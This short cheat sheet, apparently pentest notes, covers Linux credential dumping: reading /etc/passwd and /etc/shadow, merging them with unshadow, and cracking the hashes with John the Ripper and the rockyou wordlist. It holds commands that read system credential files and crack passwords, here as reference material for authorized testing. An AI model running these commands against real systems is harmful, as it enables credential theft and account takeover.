# Linux Credential Access

## **Credential Dumping**

***

### **Dump /etc/passwd & /etc/shadow**

***

Copy the files to the local system

```jsx
cat /etc/passwd cat /etc/shadow
```

Unshadow the files

```jsx
unshadow passwd.txt shadow.txt > unshadow.txt
```

Crack the hashes (using John the Ripper as an example)

```jsx
sudo john --wordlist=/usr/share/wordlist/rockyou.txt unshadow.txt
```
